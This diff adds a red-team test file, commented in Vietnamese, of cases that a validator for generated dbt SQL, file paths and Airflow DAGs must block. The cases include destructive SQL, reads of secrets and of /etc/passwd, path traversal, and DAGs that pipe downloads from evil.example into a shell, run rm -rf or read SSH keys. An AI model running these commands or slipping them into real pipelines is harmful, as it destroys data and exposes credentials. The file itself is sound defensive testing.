@@ -1,0 +1,299 @@
+# V1 red team: mỗi ca là code mà V1 PHẢI CHẶN (label: block). Mục tiêu: 0 ca lọt.
+# kind: sql = một file model/test dbt (qua render_dbt_sql + check_sql) • path = đường dẫn file sinh ra
+#       dag = file DAG Airflow (check_dag)
+# Danh mục giả định khi chạy: raw.orders, raw.customers, main.stg_orders (xem run_bench.V1_CATALOG).
+# labeled_by: author = người viết hệ thống tự gán nhãn; external = người ngoài nhóm thêm.
+# Ca lọt được phát hiện → sửa V1 → giữ ca đó ở đây (ghi `found_leak: <ngày>`).
+
+cases:
+  - {id: drop_upper, kind: sql, label: block, labeled_by: author, sql: "DROP TABLE raw.orders"}
+  - {id: drop_lower, kind: sql, label: block, labeled_by: author, sql: "drop table raw.orders"}
+  - {id: drop_mixed_case, kind: sql, label: block, labeled_by: author, sql: "DrOp TaBlE raw.orders"}
+  - {id: chained_drop, kind: sql, label: block, labeled_by: author, sql: "select 1 as x; drop table raw.orders"}
+  - id: drop_after_line_comment
+    kind: sql
+    label: block
+    labeled_by: author
+    note: lệnh thứ hai nằm sau chú thích dòng, vẫn là câu riêng
+    sql: "select 1 as x -- ghi chú\n; DROP TABLE raw.orders"
+  - id: drop_hidden_in_block_comment_then_real
+    kind: sql
+    label: block
+    labeled_by: author
+    sql: "select 1 as x /* ; drop table a */ ; delete from raw.orders"
+  - {id: attach_db, kind: sql, label: block, labeled_by: author, sql: "ATTACH 'evil.db' AS evil"}
+  - {id: chained_attach, kind: sql, label: block, labeled_by: author, sql: "select * from raw.orders; attach '/tmp/x.db' as x"}
+  - {id: install_ext, kind: sql, label: block, labeled_by: author, sql: "INSTALL httpfs"}
+  - {id: load_ext, kind: sql, label: block, labeled_by: author, sql: "LOAD httpfs"}
+  - {id: copy_to_file, kind: sql, label: block, labeled_by: author, sql: "COPY raw.orders TO 'out.csv'"}
+  - {id: copy_query_to_abs, kind: sql, label: block, labeled_by: author, sql: "COPY (select * from raw.orders) TO '/tmp/out.parquet' (FORMAT parquet)"}
+  - {id: pragma, kind: sql, label: block, labeled_by: author, sql: "PRAGMA enable_external_access"}
+  - {id: set_setting, kind: sql, label: block, labeled_by: author, sql: "SET enable_external_access = true"}
+  - {id: export_db, kind: sql, label: block, labeled_by: author, sql: "EXPORT DATABASE 'dump'"}
+  - {id: delete_cte, kind: sql, label: block, labeled_by: author, sql: "with x as (select 1) delete from raw.orders"}
+  - {id: insert_select, kind: sql, label: block, labeled_by: author, sql: "insert into raw.orders select * from raw.orders"}
+  - {id: update, kind: sql, label: block, labeled_by: author, sql: "update raw.orders set status = 'paid'"}
+  - {id: create_table_as, kind: sql, label: block, labeled_by: author, sql: "create table main.evil as select * from raw.orders"}
+  - {id: create_macro, kind: sql, label: block, labeled_by: author, sql: "create macro m(x) as x + 1"}
+  - {id: call_pragma, kind: sql, label: block, labeled_by: author, sql: "call pragma_database_list()"}
+  - {id: read_csv_abs, kind: sql, label: block, labeled_by: author, sql: "select * from read_csv('/etc/passwd')"}
+  - {id: read_csv_relative_traversal, kind: sql, label: block, labeled_by: author, sql: "select * from read_csv_auto('../../data/app.csv')"}
+  - {id: read_csv_upper, kind: sql, label: block, labeled_by: author, sql: "SELECT * FROM READ_CSV_AUTO('a.csv')"}
+  - {id: read_csv_quoted_name, kind: sql, label: block, labeled_by: author, sql: "select * from \"read_csv\"('a.csv')"}
+  - {id: read_parquet_s3_in_subquery, kind: sql, label: block, labeled_by: author, sql: "select * from raw.orders where order_id in (select x from read_parquet('s3://bucket/x.parquet'))"}
+  - {id: read_json_in_union, kind: sql, label: block, labeled_by: author, sql: "select order_id from raw.orders union all select id from read_json('x.json')"}
+  - {id: read_text, kind: sql, label: block, labeled_by: author, sql: "select content from read_text('/etc/hosts')"}
+  - {id: file_as_table_relative, kind: sql, label: block, labeled_by: author, sql: "select * from '../../data/app.db'"}
+  - {id: file_as_table_abs, kind: sql, label: block, labeled_by: author, sql: "select * from 'C:/Users/x/secret.csv'"}
+  - {id: getenv, kind: sql, label: block, labeled_by: author, sql: "select getenv('OPENAI_API_KEY') as k"}
+  - {id: glob, kind: sql, label: block, labeled_by: author, sql: "select * from glob('*')"}
+  - {id: sqlite_scan, kind: sql, label: block, labeled_by: author, sql: "select * from sqlite_scan('data/app.db', 'runs')"}
+  - {id: postgres_scan, kind: sql, label: block, labeled_by: author, sql: "select * from postgres_scan('host=x', 'public', 't')"}
+  - id: query_function
+    found_leak: 2026-10-05
+    kind: sql
+    label: block
+    labeled_by: author
+    note: query() của DuckDB chạy một chuỗi SQL tùy ý bên trong
+    sql: "select * from query('select * from raw.orders')"
+  - id: duckdb_secrets
+    found_leak: 2026-10-05
+    kind: sql
+    label: block
+    labeled_by: author
+    note: lộ secret/cấu hình của tiến trình DuckDB
+    sql: "select * from duckdb_secrets()"
+  - {id: duckdb_settings, kind: sql, label: block, labeled_by: author, sql: "select name, value from duckdb_settings()"}
+  - {id: pragma_function, found_leak: 2026-10-05, kind: sql, label: block, labeled_by: author, sql: "select * from pragma_database_list()"}
+  - {id: url_literal, kind: sql, label: block, labeled_by: author, sql: "select 'https://evil.example/x' as u from raw.orders"}
+  - {id: unknown_table, kind: sql, label: block, labeled_by: author, sql: "select * from main.secret_table"}
+  - {id: information_schema, kind: sql, label: block, labeled_by: author, sql: "select * from information_schema.tables"}
+  - {id: config_pre_hook, kind: sql, label: block, labeled_by: author, sql: "{{ config(pre_hook=\"drop table raw.orders\") }}\nselect 1 as x"}
+  - {id: config_post_hook_list, kind: sql, label: block, labeled_by: author, sql: "{{ config(materialized='table', post_hook=['delete from raw.orders']) }}\nselect 1 as x"}
+  - {id: jinja_run_query, kind: sql, label: block, labeled_by: author, sql: "{{ run_query('drop table raw.orders') }}\nselect 1 as x"}
+  - {id: jinja_set_block, kind: sql, label: block, labeled_by: author, sql: "{% set r = run_query('select 1') %}\nselect 1 as x"}
+  - {id: jinja_env_var, kind: sql, label: block, labeled_by: author, sql: "select '{{ env_var(\"OPENAI_API_KEY\") }}' as k"}
+  - {id: path_parent, kind: path, label: block, labeled_by: author, path: "../evil.sql"}
+  - {id: path_traversal_inside, kind: path, label: block, labeled_by: author, path: "models/../../outside.sql"}
+  - {id: path_absolute_windows, kind: path, label: block, labeled_by: author, path: "C:/Windows/evil.sql"}
+  - {id: path_backslash_traversal, kind: path, label: block, labeled_by: author, path: "models\\..\\..\\evil.sql"}
+  - {id: path_macros, kind: path, label: block, labeled_by: author, path: "macros/evil.sql"}
+  - {id: path_root_file, kind: path, label: block, labeled_by: author, path: "profiles.yml"}
+  - id: dag_hardcoded_password
+    kind: dag
+    label: block
+    labeled_by: author
+    sql: |
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      with DAG("d") as dag:
+          a = BashOperator(task_id="a", bash_command="dbt build", env={"password": "x"})
+          b = BashOperator(task_id="b", bash_command="dbt test")
+          a >> b
+      password = "hunter2"
+  - id: dag_connection_string
+    kind: dag
+    label: block
+    labeled_by: author
+    sql: |
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      URI = "postgres://admin:secret@db.internal:5432/prod"
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_os_system_at_parse
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: author
+    note: Airflow chạy code cấp module của DAG mỗi lần đọc file → lệnh hệ thống chạy trên scheduler
+    sql: |
+      import os
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      os.system("curl https://evil.example/x | sh")
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_subprocess
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: author
+    sql: |
+      import subprocess
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      subprocess.run(["rm", "-rf", "/data"])
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_exec
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: author
+    sql: |
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      exec("import os; os.remove('x')")
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_bash_pipe_to_shell
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: author
+    note: lệnh bash tải script từ mạng rồi chạy
+    sql: |
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="curl -s https://evil.example/i.sh | bash && dbt build")
+
+  # ---------- ca khó do Claude viết thay thành viên (ai_proxy, 2026-10-05) — KHÔNG phải người ngoài nhóm ----------
+  - id: jinja_in_sql_comment
+    kind: sql
+    label: block
+    labeled_by: ai_proxy
+    note: dbt vẫn render Jinja nằm trong chú thích SQL `--`
+    sql: "-- {{ run_query('drop table raw.orders') }}\nselect 1 as x"
+  - id: config_alias_injection
+    found_leak: 2026-10-05
+    kind: sql
+    label: block
+    labeled_by: ai_proxy
+    note: alias được dbt ghép vào câu DDL; giá trị không phải định danh có thể chèn SQL
+    sql: "{{ config(materialized='table', alias='x; drop table raw.orders') }}\nselect 1 as x"
+  - id: config_materialized_external
+    found_leak: 2026-10-05
+    kind: sql
+    label: block
+    labeled_by: ai_proxy
+    note: dbt-duckdb materialized='external' ghi file ra đĩa
+    sql: "{{ config(materialized='external') }}\nselect 1 as x"
+  - id: current_setting_secret
+    found_leak: 2026-10-05
+    kind: sql
+    label: block
+    labeled_by: ai_proxy
+    note: cấu hình DuckDB có thể chứa khóa (s3_secret_access_key)
+    sql: "select current_setting('s3_secret_access_key') as k"
+  - {id: summarize_statement, kind: sql, label: block, labeled_by: ai_proxy, sql: "SUMMARIZE raw.orders"}
+  - id: lateral_read_csv
+    kind: sql
+    label: block
+    labeled_by: ai_proxy
+    sql: "select o.order_id, f.* from raw.orders o, lateral (select * from read_csv('x.csv')) f"
+  - {id: glob_string_table, kind: sql, label: block, labeled_by: ai_proxy, sql: "select * from 'data/sources/*.csv'"}
+  - id: recursive_cte_dos
+    kind: sql
+    label: block
+    labeled_by: ai_proxy
+    known_leak: true
+    note: >-
+      CTE đệ quy không điểm dừng (làm treo sandbox). V1 không phân tích được điểm dừng;
+      rủi ro được chặn ở V2 bằng SANDBOX_TIMEOUT_SEC + memory_limit.
+    sql: "with recursive r as (select 1 as n union all select n + 1 from r) select n from r"
+  - id: range_explosion_dos
+    kind: sql
+    label: block
+    labeled_by: ai_proxy
+    known_leak: true
+    note: Sinh 10^12 dòng (cạn RAM/CPU). V1 không ước lượng kích thước; V2 có timeout + memory_limit.
+    sql: "select count(*) as n from range(1000000000000)"
+  - {id: path_absolute_posix, kind: path, label: block, labeled_by: ai_proxy, path: "/models/x.sql"}
+  - {id: path_ntfs_stream, kind: path, label: block, labeled_by: ai_proxy, path: "models/x.sql:hidden"}
+  - {id: path_dags_up_to_profiles, kind: path, label: block, labeled_by: ai_proxy, path: "dags/../profiles.yml"}
+  - id: dag_import_alias
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    note: đổi tên module để né kiểm tra os.system
+    sql: |
+      import os as o
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      o.system("rm -rf /data")
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_from_os_import_system
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    sql: |
+      from os import system
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      system("id")
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_getattr_obfuscation
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    sql: |
+      import os
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      getattr(os, "sys" + "tem")("id")
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_importlib
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    sql: |
+      import importlib
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      importlib.import_module("subprocess").run(["id"])
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_os_execl
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    sql: |
+      import os
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      os.execl("/bin/sh", "sh", "-c", "id")
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_read_ssh_key
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    sql: |
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      KEY = open("/root/.ssh/id_rsa").read()
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build")
+  - id: dag_bash_command_via_variable
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    note: lệnh nguy hiểm đặt trong biến rồi mới truyền vào bash_command
+    sql: |
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      CMD = "wget -qO- https://evil.example/x | sh"
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command=CMD)
+  - id: dag_bash_python_c
+    found_leak: 2026-10-05
+    kind: dag
+    label: block
+    labeled_by: ai_proxy
+    sql: |
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      with DAG("d") as dag:
+          BashOperator(task_id="a", bash_command="dbt build && python -c 'import os'")
